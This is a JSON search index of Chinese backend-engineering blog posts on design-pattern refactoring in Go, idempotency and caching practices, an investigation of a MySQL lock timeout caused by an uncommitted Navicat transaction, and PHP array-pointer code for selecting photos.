[{"categories":["后端","设计模式"],"content":"背景 在开发过程中你是否有遇到过这样的苦恼？产品发来一个需求，没做过，但是看完需求感觉应该处理起来很简单，然后找到对应的业务代码，发现代码像打乱的毛线一样理不清楚，各种逻辑嵌套，各种特殊判断处理，想要拓展维护个内容却无从下手，一边看着代码，一边用手拨动着本就为数不多的秀发，然后口吐芬芳 。 有没发现一个问题，为什么业务不复杂，但是随着产品迭代，经过不断拓展和维护，慢慢的代码就越做越乱，你可以说产品想法天马星空，人员流动大，多人参与慢慢的就被做乱了，这可能是个不错的借口，但是其中本质的问题还是前期思考的太少，没有进行合理的抽象设计，没有去前瞻性的去预埋一些未来可拓展性的内容，所以最终导致了后来的局面。 经常听到有经验的开发者说开发前多思考，不要一拿到需求就习惯性的一顿操作，反手就定义一个 function 根据需求逻辑一条龙写到底。 所以面对相对复杂的需求我们需要进行抽象思考，尽可能做到设计出来的东西是解决一类问题，而不是单单解决当前问题，然后在代码实现上也要面向抽象开发，这样才能做到真正的高质量代码，可维护性和可拓展性高，才能沉淀出可复用，健壮性强的系统。 那么我们要如何去抽象呢？面对需求的抽象思维这个需要平时多锻炼，拿到需求多想多思考，不要急于求成，主要围绕着这几大要素：可维护性、可拓展性、可复用性，安全性去设计解决方案，至于代码上的抽象就可以使用下面的方式。 不卖关子了，是时候请出今天的主角：《设计模式》，简单的说设计模式就是开发者们的经验沉淀，通过学习设计模式并在业务开发过程中加以使用，可以让代码的实现更容易拓展和维护，提高整体代码质量，也可以作为开发之间沟通的专业术语，提到某个模式，可以马上 get 到代码设计，减少沟通的成本。 这里就不一一介绍 23 种设计模式和设计模式的 6 个原则，可以 google 回顾下 推荐：学习设计模式地址 下面就将结合当前项目的 bad case，手把手的使用设计模式进行重构，其中会用到多种设计模式的使用，并且体现了设计模式的中的几个原则，做好准备，发车了。 ","date":"2022-01-01","objectID":"/posts/2022-01-20-design-pattern/:0:1","tags":["后端","设计模式"],"title":"今天你设计了吗？","uri":"/posts/2022-01-20-design-pattern/"},{"categories":["后端","设计模式"],"content":"举例 需求背景概要： APP 首页功能，用模块化的方式去管理配置，后台可以配置模块标识和模块排序，展示条件等，首页 API 接口获取当前用户的模块列表，并构造模块数据展示。 API Response Data 伪响应数据，忽略掉不重要或者重复的数据 { \"code\": 0, \"data\": { \"tools\": { // -- 模块信息 -- \"id\": 744, \"icon\": \"\", \"name\": \"\", \"sub_title\": \"\", \"module\": \"lm_tools\", \"sort\": 1, \"is_lock\": true, \"is_show\": true, \"more_text\": \"\", \"more_uri\": \"xxx:///tools/more\", \"list\": [ // -- 模块展示数据 -- ] }, \"my_baby\": { // ... ... }, \"knowledge_parenting\": { // ... ... }, \"early_due\": { // ... ... }, // ... ... \"message\": \"\" } Before Code 伪代码，忽略掉一些不重要的 code func (hm *HomeModule) GetHomeData() map[string]interface{} { result := make(map[string]interface{}) // ... ... // 获取模块列表 module := lm.GetHomeSortData() // ... ... // 构造每个模块的数据 for _, module := range moduleList { // ... ... switch module.Module { case \"my_baby\": // ... ... result[\"my_baby\"] = data case \"lm_tools\": // ... ... result[\"lm_tools\"] = data case \"weight\": // ... ... result[\"weight\"] = data case \"diagnose\": result[\"diagnose\"] = data case \"weather\": // ... ... result[\"weather\"] = data case \"early_edu\": // ... ... result[\"early_edu\"] = data case \"today_knowledge\": // ... ... data[\"tips\"]=list // ... ... data[\"life_video\"]=lifeVideo // ... ... result[\"today_knowledge\"] = data default: result[module.Module] = module } // ... ... return result } 看完这个代码，是否有一种要坏起来的味道，随着模块不断增加，case 会越来越多，而且每个 case 里面又有一些针对版本、针对 AB、一些特殊处理等，让代码变得又臭又长，越来越难去拓展和维护，并且每次维护或者拓展都可能在GetHomeData() 方法里在不断往里面添油加醋，不小心就会对整个接口产生影响。 那么我们要如何去重构呢，这就要抽象起来，这个业务本身就已经有模块相关抽象设计，这里就不进行调整，主要是针对代码上的抽象，结合设计模式进行改造。 以下就是重构的过程。 刚开始的时候，看到这种 case 判断，然后做模块数据的聚合，我第一反应是，能否可以使用工厂模式，定义一个 interface，每个模块定义一个struct 实现接口ExportData() 方法，通过工厂方法去根据模块标识创建对象，然后调用导出数据方法进行数据上的聚合 。 但是在评估的过程中，发现有些模块数据里又聚合了多个不同业务知识内容的数据，单纯的工厂模式又不太合适，最后决定使用组合模式，结构型设计模式，可以将对象进行组合，实现一个类似层级对象关系，如： # 首页模块 home - my_baby - weight - early_edu - today_knowledge - tips - life_video - weather - ... ... 这里我重新定义了下名词，后台配置的是模块，在代码实现上我把每个模块里展示的数据定义成 组件，组件又可以分成 单一组件 和 复合组件，复合组件就是使用了多个单一组件组成。 UML 结构图： Refactor After Code： 定义组件接口 IElement ： // IElement 组件接口 type IElement interface { // Add 添加组件，单一组件，可以不用实现具体方法内容 Add(compUni string, compo IElement) // ExportData 输出组件数据 ExportData(parameter map[string]interface{}) (interface{}, error) } 定义组件类型枚举 // EElement 组件类型 type EElement string const ( EElementTips EElement = \"tips\" // 贴士 EElementLifeVideo EElement = \"life_video\" // 生命一千天 EElementEarlyEdu EElement = \"early_edu\" // 早教 EElementBaby EElement = \"baby\" // 宝宝 ECompositeTodayKnowledge EElement = \"today_knowledge\" // 今日知识 // .... ) func (ec EElement) ToStr() string { return string(ec) } 单一组件的实现 // ElemTips 贴士组件 type ElemTips struct { } func NewCompoTips() *ElementTips { return \u0026ElementTips{} } func (c *ElementTips) Add(compoUni string, comp IElement) { } func (c ElementTips) ExportData(parameter map[string]interface{}) (interface{}, error) { tips := []map[string]interface{}{ { \"id\": 1, \"title\": \"贴士1\", }, { \"id\": 2, \"title\": \"贴士2\", }, { \"id\": 3, \"title\": \"贴士3\", }, { \"id\": 4, \"title\": \"贴士4\", }, } return tips, nil } // ElemLifeVideo 生命一千天组件 type ElemLifeVideo struct { } func NewCompoLifeVideo() *ElementLifeVideo { return \u0026ElementLifeVideo{} } func (c ElementLifeVideo) Add(compoUni string, comp IElement) { } func (c ElementLifeVideo) ExportData(parameter map[string]interface{}) (interface{}, error) { lifeVideos := []map[string]interface{}{ { \"id\": 1, \"title\": \"生命一千天1\", }, { \"id\": 2, \"title\": \"生命一千天2\", }, { \"id\": 3, \"title\": \"生命一千天3\", }, { \"id\": 4, \"title\": \"生命一千天4\", }, } return lifeVideos, nil } // ... ... 复合组件: // 今日知识，组合多个dan'yi组件 type ElemTodayKnowledge struct { Composite map[string]IElement } func NewCompoTodayKnowledge() *ElemTodayKnowledge { factory := NewElementFactory() c := new(ElemTodayKnowledge) c.Add(EElementTips.ToStr(), factory.CreateElement(EElementTips.ToStr())) c.Add(EElementEarlyEdu.ToStr(), factory.CreateElement(EElementEarlyEdu.ToStr())) return c } func (c *ElemTodayKnowledge) Add(compoUni string, comp IElement) { if c.Composite == nil { c.Composite = map[string]IElement{} } c.Composite[compoUni] = com","date":"2022-01-01","objectID":"/posts/2022-01-20-design-pattern/:0:2","tags":["后端","设计模式"],"title":"今天你设计了吗？","uri":"/posts/2022-01-20-design-pattern/"},{"categories":["后端","设计模式"],"content":"总结： 最后，为了减少重复的代码开发，避免做添油加醋的事情，为了项目的可维护性，可拓展性，也避免成为后人口吐芬芳的对象，我们需要设计起来，实现可以应对变化，有弹性的系统。 ","date":"2022-01-01","objectID":"/posts/2022-01-20-design-pattern/:0:3","tags":["后端","设计模式"],"title":"今天你设计了吗？","uri":"/posts/2022-01-20-design-pattern/"},{"categories":["总结"],"content":"从事服务端工作，已经有大几年了，从懵懂的小菜鸡，成长为可以自由飞翔的秃鹰，那些逝去青春和的头发见证了自己的成长 或许，这就是高手的应该有样子吧 这里将会把类似的问题/业务场景的解决方案中，提炼出相对通用的部分，作为经验进行梳理罗列出来，共勉 ","date":"2020-12-01","objectID":"/posts/2020-12-01-shared-experience-2/:0:0","tags":["经验总结"],"title":"大话后端开发的奇淫技巧-2","uri":"/posts/2020-12-01-shared-experience-2/"},{"categories":["总结"],"content":"幂等 业务场景： 用户多次点击按钮，或者因为设备的性能问题，连接的网络问题，点击按钮没反应，用户就会继续尝试点击，导致触发多次请求提交 解决方案： 客户端防重点击： 防重点击，只允许点击一次，通过记录按钮的状态值，控制按钮不可点击，等响应结果回来才能再次被点击 服务端: 1.表约束 表设计字段的唯一约束，比如：签到记录表，用户 ID+签到日期这两个字段组合建立唯一索引 UNIQUE，使用事物操作，先 INSERT 签到记录，成功后再去 UPDATE 积分 并行执行的时候，必然只能有一个 INSERT 成功，其他都失败，最终只会累加一次积分 2.分布式锁 分布式锁约束，可以利用 redis incr 原子操作的特性来实现 在操作业务前，先获取用户 ID 的 incr，获取到值=1，代表获取到锁成功，进行原子操作，然后执行业务逻辑，执行成功后删除掉 key 如果获取到值\u003e1 获取执行锁失败，代表执行没结束，锁没有释放，无法继续执行，直接返回失败 这里需要注意避免网络抖动或者业务执行报错导致最终 key 删除没成功，所以再执行 incr 获取锁成功后，同时获取下 ttl 值，如果 ttl 没设置，这个时候需要对 key 设置下 ttl，超出时间后让 key 自动过期，以免锁没释放，导致死锁 3.token 机制 在操作前先获取令牌 token，token 只能被使用一次，执行业务逻辑前，需要去 update token 使用状态，update 成功，才能执行后续业务逻辑，update 失败，代表 token 已经被使用，返回失败 可以使用 mysql token 表+redis list，list 作为令牌桶，需要的业务从队列中 pop 获取令牌，使用的时候状态 update token 表 ","date":"2020-12-01","objectID":"/posts/2020-12-01-shared-experience-2/:0:1","tags":["经验总结"],"title":"大话后端开发的奇淫技巧-2","uri":"/posts/2020-12-01-shared-experience-2/"},{"categories":["总结"],"content":"主从延迟 业务场景： 用户反馈说看不到刚提交的数据或者没更新成功，或者触发了非正常流程能理解的逻辑，排查后发现数据正常 解决方案： 说到主从延迟，大家应该就不陌生了，只要数据库（mysql，redis）部署是主从分离的，多多少少都会遇到过这种问题 低概率场景，就是数据写入/更新到主库，从库因为网络抖动等原因，没有及时同步到，然后查询的时候走的是从库，导致查到的是脏数据，这种情况就只能竟可能保障服务器环境稳定 其实出现这种问题比较多的情况是，insert/update 到主库成功后，马上就查询数据，这个时候可能数据还没同步到从库，虽然主从同步会比较快，但是还是有一定的延迟性 这种情况就需要将查询指定到主库上进行操作，就可以避免主从延迟，查询不到最新数据的问题 ","date":"2020-12-01","objectID":"/posts/2020-12-01-shared-experience-2/:0:2","tags":["经验总结"],"title":"大话后端开发的奇淫技巧-2","uri":"/posts/2020-12-01-shared-experience-2/"},{"categories":["总结"],"content":"并发 业务场景： 用户快速点击按钮，或者通过压测工具，写脚本发起并发请求分发到多台服务器，多台同时接收到请求，多次/并发请求有机率会并行执行，导致超出正常逻辑范围的问题 往往在这种情况下，会出现很多异常的数据，比如：同一天多条的签到记录，并且多次累加积分奖励 职业羊毛党使用工具或者写脚本恶意发起并发请求接口，翻倍获利后提现，从漏洞中谋取利益 解决方案： 表约束 同 ↑ 幂等的解决方案 ","date":"2020-12-01","objectID":"/posts/2020-12-01-shared-experience-2/:0:3","tags":["经验总结"],"title":"大话后端开发的奇淫技巧-2","uri":"/posts/2020-12-01-shared-experience-2/"},{"categories":["总结"],"content":"安全隐私 业务场景： 在涉及用户隐私数据或者一些商业性敏感数据业务，接口下发数据的时候没有做脱敏，把用户的隐私的数据赤裸裸的暴露出来，如：将用户的手机号，身份证号码，等重要信息直接明文及接口输出 将用户 ID 作为图片命名，可以轻松遍历用户上传的图片，身份证照片等，用于非法用途 解决方案： 数据脱敏： 在不违反系统规则条件下，对真实数据进行改造，进行数据脱敏 根据规则改造敏感数据输出 中间加星 截断 替换 … 敏感数据传递，加密处理 aes 加密 hashids 足够短，不可预测且唯一的数字 ID … CND 媒体地址安全： 大部分 cdn 平台都支持 URL 鉴权 防止通过规则去构造地址 防盗链 地址设置过期时间，超时后不可访问 限制访问 Referer 防盗链 UserAgent 黑白名单 IP 黑白名单 等（具体看第三支持） ","date":"2020-12-01","objectID":"/posts/2020-12-01-shared-experience-2/:0:4","tags":["经验总结"],"title":"大话后端开发的奇淫技巧-2","uri":"/posts/2020-12-01-shared-experience-2/"},{"categories":["总结"],"content":"MQ 业务解耦神器 异步业务解耦 业务场景： 比如，订单下单结算成功后，发送推送通知、发放优惠券奖励，操作业务异步任务，通知用户领取，等 类似这种非业务主流程里内容，主流程执行完成后可以立即返回响应给用户，其他一些成功后的附加操作通过入列到 MQ，进行异步的处理 MQ 也可以用于实现跨进程，跨语言消息通讯 通多订阅方便业务拓展，ack 机制保障执行的完成，死信队列，进行容错处理 不同的 MQ 中间件的支持略有差异，各有各的特性，大同小异，不同 MQ 优势也不一样，可以根据自己的需求场景选择合适的中间件 rabbitmq kafka rocketmq … ","date":"2020-12-01","objectID":"/posts/2020-12-01-shared-experience-2/:0:5","tags":["经验总结"],"title":"大话后端开发的奇淫技巧-2","uri":"/posts/2020-12-01-shared-experience-2/"},{"categories":["总结"],"content":"缓存大法 在高并发场景下，通过缓存热数据，减轻 DB 压力，提高响应速度 缓存可以分为服务端缓存和客户端缓存 服务端缓存： 当前使用比较多的分布式内存缓存数据库就是 redis，结合支持的数据类型和特性，再加上开发的创造力，可以满足大部分需求 但是在使用的过程中也会遇到一些使用不当的问题，这里罗列下常见的问题： 1.缓存更新 对于一些用户私有数据，一般会在数据更新的时候，del cache，然后后续获取的数据的时候，先从 cache 中获取，如果不存在，再从 db-\u003ecache，最后输出给用户 但是由于网络抖动等，有可能会低概率的导致 del cache 没成功，所以，一般我们会在设置 cache 的时候加过期时间，让脏数据可以在短时间内失效，这样也可以对于一些不常查询的数据进行过期清理 对于一些公用的热数据，如：商品列表等，运营人员通过后台配置商品，配置完成后，最后操作缓存更新，这个时候需要对缓存进行平滑的过度更新，不能先删除 key，再写入缓存，这种操作会导致有用户在缓存更新进去前，短暂时间区间内获取不到商品 之前做过类似的需求，解决方案就是，会在创建的缓存 key 设计版本号规则，然后缓存创建成功后，在替换可以展示的版本号，把旧的版本号的数据设置过期时间 旧版本数据不能马上删除，设置合理过期时间，是因为旧版本数据还会在短时间内被使用，比如：用户已经使用旧版本数据查询，并且继续后面的分页查询，设置过期时间可以合理时间内再过去清理掉旧不使用的数据 数据获取就先获取当前要展示的版本号，然后获取本号对应的数据 早前有写过一个类似的，场景会更佳复杂的缓存更新的方案，高并发业务接口开发思路 2.穿透 cache 和 db 中都没有数据，读完 cache 没有，再读 db 还是没有，每次都请求到 cache 和 db 一般情况就是 null 数据问题导致，解决方案就是，可以将 null 也缓存起来，避免穿透到 DB 如果有较多 null 数据，可以使用 bitmaps 布隆过滤器，来标识存储 null 的数据，节约存储空间 3.击穿，雪崩 出现大量 cache 数据同时过期，导致大量请求同时请到 db 对于高并发业务的热数据的缓存，就不能删除/设置过期时间，只能通过平滑的过度进行更新，类似上面缓存更新中提到的方案 4.压缩数据，数据过期 redis 缓存使用的是内存空间，所以比较稀缺，即使财大气粗分布式再多的机器，也经不起不起随意的霍霍 对于不使用的字段，或者数据，都不要存储到缓存，有时候就是为了方便，直接 json 序列化整个对象，就直接缓存起来了 对于用户私有的缓存，或者热度不高的缓存，需要设置缓存过期时间，避免长期不查询的垃圾数据堆积，占用空间，后面遇到的瓶颈，再来清理就麻烦了 客户端缓存: 1.缓存版本数据 客户端缓存数据+数据版本号，每次获取数据的时候上传数据版本号参数，服务端校验是否最新数据，如果是最新就不下发数据，客户端可以继续使用本地数据 2.增量拉取更新 服务端接口返回数据的时候，返回当前时间戳，客户端对数据和拉取时间戳进行缓存，后续客户端请求带上时间戳，服务端匹配更新时间\u003e时间戳时间的数据，进行下发，实现客户端数据的增量/修改更新 redis 巧用 分布式锁 ↑ 有提到 限制频率 Redis 实战之限制操作频率 定时队列 Redis 实战之实现定时执行任务 ","date":"2020-12-01","objectID":"/posts/2020-12-01-shared-experience-2/:1:1","tags":["经验总结"],"title":"大话后端开发的奇淫技巧-2","uri":"/posts/2020-12-01-shared-experience-2/"},{"categories":["总结"],"content":"日志/监控 关于日志： 当线上用户反馈问题的时候，我们需要去排查问题，就靠用户的几段描述和 APP 的截图，有时候很难排查出根本问题 这个时候如果能提供用户的请求日志轨迹就可以很好帮助到排查 我们目前对于日志这块的支持有两块，一个是 nginx 请求日志，通过 elk 搭建日志系统，进行日志的收集和展示 同时在数加也会备份可一份长时间的请求日志，对于历史过长的请求日志，可以到数加进行表查询 一般的错误日志也可以上报到 elk 中，独立出一个 err group 方便查询 ELK 数加历史请求日志 关于监控： 监控可以分为，服务器的监控，业务功能的监控 线上服务器稳定性，决定了业务功能的稳定一个重要因素，这部分主要是运维这边去保障 业务功能的监控，除了偶尔翻下错误日志，修复异常情况以外，还需要对于一些业务进行功能的监控，比如：一些定时的服务，定时的推送，每天整点需要对没有记录的用户进行提醒推送，需要保障圈定用户的效率和推送的速度，保障在规定时间内容推送出去 随着业务增长，数据不断的增加，原本一个小时搞定的执行，可能会一直的延长，最后可能一整天都执行不完，对应这种业务，就需要在用户反馈之前，优先的 get 到问题，然后进行优化改善 这个时候就需要有一个监控功能，对业务功能进行监控，超出预警进行预警通知，尽快的改善问题 ","date":"2020-12-01","objectID":"/posts/2020-12-01-shared-experience-2/:1:2","tags":["经验总结"],"title":"大话后端开发的奇淫技巧-2","uri":"/posts/2020-12-01-shared-experience-2/"},{"categories":["总结"],"content":"总结 在服务端开发的这几年，参与过公司里的好几个项目，有电商相关，工具类相关，等，因为项目本身技术背景和技术改进需要，在开发语言上也涉猎了好几门，有 .net（项目），java（项目），nodejs（项目），python（采集，爬虫），php（转岗项目），golang（微服务），谈不上每个语言都有多么的熟练，一般的业务开发是没有多大问题 其实语言就是一个实现业务需求的工具，就像锄头和镐子，镰刀和柴刀，菜刀和小刀，基础使用方式差不多，就是在不同的需求场景下优势不一样，适合的场景使用适合的工具 参与这么多个项目和涉猎这么多的语言，会发现服务端的经验是通用的，与语言和项目无关，就是解决一些问题和业务场景的解决思路和方案 竟可能在一段时间里对参与过的业务/问题的解决方案进行梳理总结，这样才能很好的把共同场景的解决方案，提炼成自己的经验，不然时间一长很多做过的内容都忘记了 ","date":"2020-12-01","objectID":"/posts/2020-12-01-shared-experience-2/:1:3","tags":["经验总结"],"title":"大话后端开发的奇淫技巧-2","uri":"/posts/2020-12-01-shared-experience-2/"},{"categories":["问题排查"],"content":"这里记录一次莫名其妙的问题排查的经历，一天快下班之际，测试反馈说测试环境出现了调度脚本报错，输出错误日志，如下： #日志输出时间：[2020-05-1417:37:00]SQLSTATE[HY000]:Generalerror:1205Lockwaittimeoutexceeded;tryrestartingtransaction[SQL]并且后面无法重现问题，时间：18:10 左右我开始排查问题 定位错误问题： 就是执行的事物没提交 COMMIT/ROLLBACK，然后其他执行语句对锁住的数据进行 UPDATE 操作，等待锁释放，最终导致锁等待超时 问题就是这么一个问题，就是不知道哪里触发了事物，而且没提交 于是开始了后面的排查的故事 … … 首先排查了业务相关表操作的代码，并没有发现有启用事物的操作，然后就一脸闷逼，这是啥操作，不应该啊，没有启动事物，怎么就数据被锁住导致超时了呢？ 排查了一轮代码后还是没定位到问题，并且这个调度的脚本线上也一直再跑，并没有出现过类似的问题 因为时间有晚了，就先回家了 在回家的路上，左思右想，开始怀疑是不是代码里其他的业务数据执行，操作了事物没有提交，然后导致后面执行的语句也在事物中执行 晚饭休息了会儿，因为有件事情在心头没解决，就很不舒服，开始继续排查问题 又排查了一轮代码，还是依然没有思绪 在排查问题到开始怀疑人生的时候，突然灵光一现，有没可能除了业务代码之外对表进行了事物操作，然后没提交 回想到测试也会经常使用 NAVICAT 去操作表，去构建测试数据，不会是测试操作数据，使用了事物，然后没提交吧，这个也是有可能的 隔天在公司，一大早等测试到了工位，马上就杀到测试的 PC 上查看了下，NAVICAT 的执行日志 看了日志后，真相大白，此时心中一万只羊驼狂奔而过~ 日志如下： [2020-05-1417:36:21][7370770][test][MYSQL]showcolumnsfrom`xxxxx`.`table_xxx`[2020-05-1417:36:21][7370770][test][MYSQL]showindexfrom`xxxxx`.`table_xxx`[2020-05-1417:36:21][7370770][test][MYSQL]showcreatetable`xxxxx`.`table_xxx`[2020-05-1417:36:26][7370770][test][MYSQL]BEGIN[2020-05-1417:36:26][7370770][test][MYSQL]deletefrom`xxxxx`.`table_xxx`where`id`='691'[2020-05-1417:36:27][7370770][test][MYSQL]select*from`xxxxx`.`table_xxx`where`baby_id`='1269'limit0,1000[2020-05-1417:36:27][7370770][test][MYSQL]showcolumnsfrom`xxxxx`.`table_xxx`[2020-05-1417:36:27][7370770][test][MYSQL]showindexfrom`xxxxx`.`table_xxx`[2020-05-1417:36:28][7370770][test][MYSQL]showcreatetable`xxxxx`.`table_xxx`[2020-05-1417:36:29][7370770][test][MYSQL]select*from`xxxxx`.`table_xxx`where`baby_id`='1269'limit0,1000[2020-05-1417:36:29][7370770][test][MYSQL]showcolumnsfrom`xxxxx`.`table_xxx`[2020-05-1417:36:29][7370770][test][MYSQL]showindexfrom`xxxxx`.`table_xxx`[2020-05-1417:36:29][7370770][test][MYSQL]showcreatetable`xxxxx`.`table_xxx`[2020-05-1417:36:31][7370770][test][MYSQL]select*from`xxxxx`.`table_xxx`where`baby_id`='1269'limit0,1000[2020-05-1417:36:31][7370770][test][MYSQL]showcolumnsfrom`xxxxx`.`table_xxx`[2020-05-1417:36:31][7370770][test][MYSQL]showindexfrom`xxxxx`.`table_xxx`[2020-05-1417:36:31][7370770][test][MYSQL]showcreatetable`xxxxx`.`table_xxx`[2020-05-1417:36:32][7370770][test][MYSQL]select*from`xxxxx`.`table_xxx`where`baby_id`='1269'limit0,1000[2020-05-1417:36:32][7370770][test][MYSQL]showcolumnsfrom`xxxxx`.`table_xxx`[2020-05-1417:36:32][7370770][test][MYSQL]showindexfrom`xxxxx`.`table_xxx`[2020-05-1417:36:32][7370770][test][MYSQL]showcreatetable`xxxxx`.`table_xxx`[2020-05-1417:37:17][7370770][test][MYSQL]select*from`xxxxx`.`table_xxx`where`baby_id`='1269'limit0,1000[2020-05-1417:37:18][7370770][test][MYSQL]showcolumnsfrom`xxxxx`.`table_xxx`[2020-05-1417:37:18][7370770][test][MYSQL]showindexfrom`xxxxx`.`table_xxx`[2020-05-1417:37:18][7370770][test][MYSQL]showcreatetable`xxxxx`.`table_xxx`[2020-05-1417:37:20][7370770][test][MYSQL]select*from`xxxxx`.`table_xxx`where`baby_id`='1269'limit0,1000[2020-05-1417:37:20][7370770][test][MYSQL]showcolumnsfrom`xxxxx`.`table_xxx`[2020-05-1417:37:20][7370770][test][MYSQL]showindexfrom`xxxxx`.`table_xxx`[2020-05-1417:37:20][7370770][test][MYSQL]showcreatetable`database`.`table_xxx`[2020-05-1417:37:22][7370770][test][MYSQL]select*from`xxxxx`.`table_xxx`where`baby_id`='1269'limit0,1000[2020-05-1417:37:22][7370770][test][MYSQL]showcolumnsfrom`xxxxx`.`table_xxx`[2020-05-1417:37:22][7370770][test][MYSQL]showindexfrom`xxxxx`.`table_xxx`[2020-05-1417:37:22][7370770][test][MYSQL]showcreatetable`xxxxx`.`table_xxx`[2020-05-1417:37:23][7370770][test][MYSQL]select*from`xxxxx`.`table_xxx`where`baby_id`='1269'limit0,1000[2020-05-1417:37:23][7370770][test][MYSQL]showcolumnsfrom`xxxxx`.`table_xxx`[2020-05-1417:37:24][7370770][test][MYSQL]showindexfrom`xxxxx`.`table_xxx`[2020-05-1417:37:24][7370770][test][MYSQL]showcreatetable`xxxxx`.`table_xxx`[2020-05-1418:05:00][7370770][test][MYSQL]ROLLBACK梳理整个事件 看日志，还原整个事件 时间：17:36:26 测试使用 NAVICAT 工具，在操作语句的时候无意间起用了事物，并且事物没提交 时间：17:37:00 测试反馈到我这里 时间：18:10:00 我开始排查问题，并且无法重现（看日志，事物已经回滚） 时间：18:10:00-隔天 排查了 N 次代码，一脸闷逼，怀疑人生，最后相信自己，开始怀疑","date":"2020-05-27","objectID":"/posts/2020-05-27-liqi-paicuo/:0:0","tags":["问题排查"],"title":"大话一次离奇的问题排查经历","uri":"/posts/2020-05-27-liqi-paicuo/"},{"categories":["业务设计"],"content":"背景： 用户上传的宝宝相册记录，一个记录可以包含 N 个照片，产品期望给用户输出影集，如：一周/宝宝百天/宝宝生日的影集 用户同一天可能会有多个记录 简化需求内容，产品期望可以将数据按周期筛选出并分散的到日期，相同记录 ID 下，再分散到每个照片 如：将最近一周的数据，按天分组，然后分散到每个记录 ID 下，每个记录 ID 都尽可能覆盖到获取照片，最终筛选 N 条数据 如：将最近 100 天的数据，按周分组，分散到每个周的日期数据，然后分散到每个记录 ID 下，每个记录 ID 都尽可能覆盖到获取照片，最终筛选 N 条数据 如：将一年的数据，按月分组，分散到每个月份的日期数据，然后分散到每个记录 ID 下，每个记录 ID 都尽可能覆盖到获取照片，最终筛选 N 条数据 结合实例说明下： 取照片顺序： 05-01-\u003eID_1-\u003e1.jpg 05-02-\u003eID_4-\u003e7.jpg 05-03-\u003eID_5-\u003e9.jpg 05-01-\u003eID_2-\u003e3.jpg 05-02-\u003eID_4-\u003e8.jpg 05-03-\u003eID_5-\u003e10.jpg 05-01-\u003eID_3-\u003e6.jpg 05-03-\u003eID_6-\u003e11.jpg 05-01-\u003eID_1-\u003e2.jpg 05-03-\u003eID_6-\u003e12.jpg 05-01-\u003eID_2-\u003e4.jpg 05-03-\u003eID_6-\u003e13.jpg 05-01-\u003eID_2-\u003e5.jpg 方案 分析需求，抽离出本质要解决的问题，其实就是根据周期（天，周，月），然后再遍历每个周围下的记录 ID，每个记录 ID 的照片都可以尽可能的覆盖到，继续遍历下一个周期下的记录 ID，直到获得 N 条数据/没数据，就结束 最初的一个解决方案，就是将数据进行按周期分组，然后遍历每个周期，取出来周期中的日期记录数据，然后将它移除，继续遍历下一个周期日期记录，直到遍历完到 15 条/没数据结束 后来发现实现起来相当的吃力，而且逻辑又有些复杂 最后发现 PHP 数组支持内部指针，基于内置指针特性，将数据按周期分组后，通过内容指针，实现每次取数据的时候偏移位置，最终实现的通用的函数封装 内部指针： \u003c?php current( \u0026$arr ) 每个数组的当前单元，初始值的 数组的第一个单元 next ( \u0026$arr ) 返回数组中的下一个单元，如果没值则返回falsh prev ( \u0026$arr ) 返回数组中的上一个单元，如果没有值则返回true end ( \u0026$arr ) 将内部指针移动到最后一个单元，并返回其值 reset ( \u0026$arr ) 将内部指针移动到第一个单元，如果没值，则返回falsh each ( \u0026$arr ) 返回数组中当前的键/值，对并将数组指针，向前移动一步 逻辑： 先获取当前数组指针值 current 如果没有数据的时候尝试 reset，重置将内部指针移动到第一个单元 通过 array_shift 获取照片数据 没数据的时候 unset，继续遍历 最后将指针位移 next，等下一次来获取 核心代码如下： \u003c?php /** * 获取分组下的素材 * @param array $periodGroups 周期分组 * @param array $selAlbums 被选中素材album数组 * @param array $log * @param int $max * @return bool */ public function getPeriodMaterial(\u0026$periodGroups, \u0026$selAlbums = [], \u0026$log = [], $max = 15) { if (empty($periodGroups)) return false; foreach ($periodGroups as $period =\u003e \u0026$dates) { //满足素材数量，out if ($this-\u003egetSelAllNums($selAlbums) \u003e= $max) return false; if (empty($dates)) continue; //数组指针 - 日期关联数组 $dateTarget = current($dates); //如果没有日期目标，重置数组指针，再尝试获取 if (empty($dateTarget)) { reset($dates); $dateTarget = current($dates); } //还是不存在日期下的记录，直接删除日期分组 if (empty($dateTarget)) { $dates = []; continue; } $date = key($dates); next($dates); //获取日期下的所有记录 $records = \u0026$dates[$date]; //数组指针 - 记录数组 $recordTarget = current($records); if (empty($recordTarget)) { reset($records); $recordTarget = current($records); } if (empty($recordTarget)) { unset($dates[$date]); continue; } $recordIndex = key($records); next($records); //获取记录 /** @var MBabyRecord $mRecord */ $mRecord = \u0026$records[$recordIndex]; /** @var array $recordDetail */ $recordDetail = \u0026$mRecord-\u003erecord_detail; $mAlbum = array_shift($recordDetail); $selAlbums[$date][$mAlbum-\u003erecord_id][] = $mAlbum; $log[] = [ 'period_num' =\u003e $period, 'date' =\u003e $date, 'record_id' =\u003e empty($mRecord-\u003eid) ? 0 : $mRecord-\u003eid, 'album_id' =\u003e empty($mAlbum-\u003eid) ? 0 : $mAlbum-\u003eid ]; if (empty($mRecord-\u003erecord_detail)) { unset($records[$recordIndex]); if (empty($records)) unset($dates[$date]); if (empty($dates)) $dates = []; continue; } } //清洗删除已经没有日期记录的分组 foreach ($periodGroups as $period =\u003e $item) { if (empty($item)) unset($periodGroups[$period]); } return true; } 百天数据，按：周数，分组 \u003c?php /** * 根据周期分组，百天根据周分组 * @param MBabyRecord[] $records * @return array */ public function groupByPeriod($records) { if (empty($records)) return []; $groups = []; foreach ($records as $item) { $recordDate = $item-\u003erecord_date; $week = Carbon::parse($recordDate)-\u003eweekOfYear; $groups[$week][$item-\u003erecord_date][] = $item; } return $groups; } 周岁数据，按：年-月份数，分组 \u003c?php /** * 根据周分组 * @param MBabyRecord[] $records * @return array */ public function groupByPeriod($records) { if (empty($records)) return []; $groups = []; foreach ($records as $item) { if (empty($item-\u003erecord_date)) continue; $recordDate = Carbon::parse($item-\u003erecord_date); $year = $recordDate-\u003eyear; $month = $recordDate-\u003emonth; $groups[$year . '-' . $month][$item-\u003erecord_date][] = $item; } return $groups; } ","date":"2020-05-01","objectID":"/posts/2020-05-01-array-pointer/:0:0","tags":["数组指针"],"title":"大话业务场景与解决方案：数据分散周期筛选","uri":"/posts/2020-05-01-array-pointer/"},{"categories":["业务设计"],"content":"背景 多数的移动端 APP 都会有做任务领取奖励的功能模块，这类需求的目的是培养用户使用习惯，提升用户活跃性，用户完成任务获得积分奖励，通过积分兑换商品或者充值话费，微信体现等。 拟定需求场景(如图 ↓)，概要：APP 底部导航中新增小任务 Tab，点击 Tab 可查看任务完成进度和领取情况，点击去完成跳转到做任务的业务界面，当用户完成任务并且满足领取条件的时候，任务 Tab 